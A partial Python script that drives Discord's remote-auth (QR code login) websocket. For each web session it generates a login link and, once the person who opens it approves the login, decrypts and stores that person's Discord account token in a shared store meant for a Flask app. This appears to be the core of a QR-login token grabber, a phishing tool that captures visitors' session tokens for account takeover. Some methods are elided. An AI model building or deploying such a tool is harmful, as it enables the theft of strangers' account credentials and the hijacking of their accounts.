import base64
import json
import threading
import time
import requests
import websocket
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
import sys
import os

# --- Global state to share data with Flask app (you can also use a small DB) ---
# We'll use a simple dictionary for this example. In a real app, use Redis or a database.
active_sessions = {}
session_user_data = {}

class DiscordAuthWebsocket:
    WS_ENDPOINT = 'wss://remote-auth-gateway.discord.gg/?v=2'
    LOGIN_ENDPOINT = 'https://discord.com/api/v9/users/@me/remote-auth/login'

    def __init__(self, session_id):
        self.session_id = session_id
        self.key = RSA.generate(2048)
        self.cipher = PKCS1_OAEP.new(self.key, hashAlgo=SHA256)
        self.heartbeat_interval = None
        self.last_heartbeat = None
        self.current_fingerprint = None
        self.ws = None
        self.should_stop = False
        self.user_data = None
        self.completed = False

    def run(self):
        print(f"Starting WebSocket for session {self.session_id}")
        self.ws = websocket.WebSocketApp(
            self.WS_ENDPOINT,
            on_open=self.on_open,
            on_message=self.on_message,
            on_error=self.on_error,
            on_close=self.on_close,
            header={'Origin': 'https://discord.com'}
        )
        self.ws.run_forever()

    # ... (keep the rest of your methods: send, heartbeat_sender, decrypt_payload, on_open, etc.) ...
    def send(self, op, data=None):
        payload = {'op': op}
        if data:
            payload.update(data)
        if self.ws and self.ws.sock and self.ws.sock.connected:
            self.ws.send(json.dumps(payload))

    def heartbeat_sender(self):
        while not self.should_stop:
            time.sleep(0.5)
            if self.last_heartbeat and self.heartbeat_interval:
                if time.time() - self.last_heartbeat >= self.heartbeat_interval:
                    self.send('heartbeat')
                    self.last_heartbeat = time.time()

    def decrypt_payload(self, encrypted_payload):
        payload = base64.b64decode(encrypted_payload)
        return self.cipher.decrypt(payload)

    def on_open(self, ws):
        self.send('init', {'encoded_public_key': self.public_key})

    def on_message(self, ws, message):
        data = json.loads(message)
        op = data.get('op')
        if op == 'hello':
            self.heartbeat_interval = data.get('heartbeat_interval') / 1000
            self.last_heartbeat = time.time()
            threading.Thread(target=self.heartbeat_sender, daemon=True).start()
        elif op == 'nonce_proof':
            nonce = data.get('encrypted_nonce')
            decrypted_nonce = self.decrypt_payload(nonce)
            proof = SHA256.new(data=decrypted_nonce).digest()
            proof = base64.urlsafe_b64encode(proof).decode().rstrip('=')
            self.send('nonce_proof', {'proof': proof})
        elif op == 'pending_remote_init':
            self.current_fingerprint = data.get('fingerprint')
            active_sessions[self.session_id] = self.current_fingerprint
        elif op == 'pending_ticket':
            encrypted_payload = data.get('encrypted_user_payload')
            payload = self.decrypt_payload(encrypted_payload).decode()
            values = payload.split(':')
            self.user_data = {
                'id': values[0],
                'discriminator': values[1],
                'avatar': values[2],
                'username': values[3]
            }
        elif op == 'pending_login':
            ticket = data.get('ticket')
            try:
                resp = requests.post(self.LOGIN_ENDPOINT, json={'ticket': ticket}, timeout=10)
                if resp.status_code == 200:
                    encrypted_token = resp.json().get('encrypted_token')
                    token = self.decrypt_payload(encrypted_token).decode()
                    self.user_data['token'] = token
                    self.completed = True
                    session_user_data[self.session_id] = self.user_data
                    self.should_stop = True
                    ws.close()
            except Exception as e:
                print(f"Token exchange error: {e}")

    # ... (error/close handlers and public_key property) ...

# Function to be called from Flask
def start_auth_session(session_id):
    auth_ws = DiscordAuthWebsocket(session_id)
    thread = threading.Thread(target=auth_ws.run, daemon=True)
    thread.start()
    # Wait for fingerprint
    timeout = 10
    while session_id not in active_sessions and timeout > 0:
        time.sleep(0.2)
        timeout -= 0.2
    fingerprint = active_sessions.pop(session_id, None)
    if fingerprint:
        return f"https://discord.com/ra/{fingerprint}"
    return None

# ... (you can also add a function to get the user data) ...

if __name__ == '__main__':
    # Keep the script alive
    while True:
        time.sleep(60)
